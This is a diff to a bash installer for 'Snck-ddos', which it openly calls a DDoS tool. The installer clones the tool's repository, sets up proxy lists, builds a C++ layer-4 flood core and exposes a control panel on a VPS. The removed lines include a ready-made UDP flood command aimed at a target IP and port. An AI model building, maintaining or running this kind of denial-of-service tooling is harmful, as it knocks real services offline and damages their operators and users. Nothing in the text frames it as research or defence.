@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# Snck-ddos one-command installer (Python panel + C++ ultra L4)
+# Snck-ddos installer — panel on :6767
 set -euo pipefail
 
 REPO_GIT="https://github.com/SnckBoy/Snck-ddos.git"
@@ -43,23 +43,20 @@ pip install --upgrade pip -q
 pip install -r requirements.txt -q
 
 touch proxies.txt live_proxies.txt
+mkdir -p static web/templates
 
 if command -v g++ >/dev/null 2>&1; then
-  echo "[*] building C++ ultra L4 core..."
-  (cd cpp && bash build.sh && chmod +x snck_ultra.sh 2>/dev/null || true) \
-    || echo "[!] C++ build failed — Python methods still work"
-else
-  echo "[!] g++ not found — skip C++ core"
+  echo "[*] building C++ L4 core..."
+  (cd cpp && bash build.sh && chmod +x snck_ultra.sh 2>/dev/null || true) || true
 fi
 
 chmod +x main.py install.sh 2>/dev/null || true
 
 echo ""
-echo "[\u2713] Snck-ddos ready"
+echo "[\u2713] ready"
 echo ""
-echo "  panel:  cd ${DIR} && source .venv/bin/activate && python main.py"
-echo "  URL:    http://0.0.0.0:6666"
-echo ""
-echo "  ultra L4 (C++ multi-process):"
-echo "    cd ${DIR}/cpp && ./snck_ultra.sh udp TARGET_IP PORT 4 64 60 1200"
+echo "  start:  cd ${DIR} && source .venv/bin/activate && python main.py"
+echo "  panel:  http://YOUR_VPS_IP:6767"
+echo "  health: http://YOUR_VPS_IP:6767/health"
+echo "  firewall: sudo ufw allow 6767/tcp"
 echo ""
